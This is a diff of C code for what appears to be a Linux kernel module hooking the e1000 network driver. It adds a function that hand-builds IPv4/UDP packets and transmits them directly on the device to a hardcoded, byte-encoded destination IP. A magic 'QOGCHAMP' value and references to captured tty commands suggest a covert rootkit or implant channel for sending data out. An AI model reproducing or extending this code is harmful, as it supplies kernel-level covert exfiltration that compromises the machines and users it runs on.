@@ -81,6 +81,18 @@ sends it up the network stack, and reallocates a new buffer.
 
 */
 
+/*
+
+SKB Notes:
+
+There are two pointers and two offsets in an skb: head, data, tail, end. 
+
+head+end represents the end. data-head represents the head room size. data is the starting of the data (i.e. payload).
+
+It follows that data+tail is the first byte of the tailroom. head+end is the first byte past the end (First byte of skb_shared_info)
+
+*/
+
 
 #define ETH_HLEN sizeof(struct ethhdr)
 #define IP_HLEN sizeof(struct iphdr)
@@ -89,10 +101,14 @@ sends it up the network stack, and reallocates a new buffer.
 
 #define UDP 17 //UDP Protocol number
 
+
+
 /*Literally spells QOGCHAMP in little endian. Keep in mind that in little endian the least 
 significant byte comes first. So, on the stack it will be 
 PMAHCGOQ where Q is is at the lowest memory address*/
-unsigned long qogchamp_magic = 0x504d414843474f51;
+const unsigned long qogchamp_magic = 0x504d414843474f51;
+
+const char* DEST = "\x81\x15\x5a\x95";
 //both of these extern structs are created in tty_util
 extern struct list_head commands; 
 
@@ -118,13 +134,16 @@ I have been unable to find proper documentation
 
 */
 
-struct sk_buff* construct_skb(char* data, unsigned int* len){ 
 
-    struct* e1000_packet;
+
+int construct_and_send_skb(char* data, unsigned int len){ 
+
+    struct e1000_packet* packet;
     
     int headroom = LL_RESERVED_SPACE(e1000_netdev);
     int tailroom = e1000_netdev -> needed_tailroom;
-    struct sk_buff* skb = alloc_skb(sizeof(struct e1000_packet) + headroom + tailroom + len, GFP_KERNEL);
+    struct sk_buff* skb = alloc_skb(sizeof(struct e1000_packet) + headroom + tailroom + len, GFP_KERNEL); //e1000_packet contains structures.
+    skb_reserve(skb, headroom);
     /*
     Post skb_reserve
                               head -->  ___________________________
@@ -151,19 +170,61 @@ struct sk_buff* construct_skb(char* data, unsigned int* len){
                     
             
 */
+    packet = skb_put_zero(skb, len+sizeof(struct e1000_packet));
 
-    skb_reserve(headroom);
+    skb_reset_network_header(skb);
 
+    packet -> iph.version = 4;
+    packet -> iph.ihl=5;
+    packet -> iph.tot_len = htons(sizeof(struct e1000_packet)+len);
+    packet->iph.frag_off = htons(IP_DF);
+    packet -> iph.ttl = 64;
+    packet -> iph.protocol = IPPROTO_UDP;
+    packet->iph.daddr = htonl(*(unsigned int*)DEST);
 
+    packet -> iph.check = ip_fast_csum((unsigned char*)&packet->iph, packet->iph.ihl);
 
+    //lets do UDP now.
 
+    packet -> udp.source = htons(42069);
+    packet -> udp.dest = htons(10000);
+    packet -> udp.len = htons(sizeof(struct e1000_packet)-sizeof(struct iphdr) + len); //UDP header length is sizeof(udphdr)+length of payload
 
+    memcpy((unsigned char*)(packet + 1), data, len);
 
     skb -> dev = e1000_netdev;
     skb -> protocol = htons(ETH_P_IP);
 
-    return skb;
     
+
+    if(dev_hard_header(skb, e1000_netdev, ntohs(skb->protocol), e1000_netdev->broadcast, e1000_netdev->dev_addr, skb->len)<0){
+        printk(KERN_INFO "Packet creation failed\n");
+        return -1;
+    } 
+
+    if(dev_queue_xmit(skb) < 0 ){
+        printk(KERN_INFO "Packet transmission failed\n");
+        return -1;
+    }
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+    
+   
+    return 0;
         
     
     
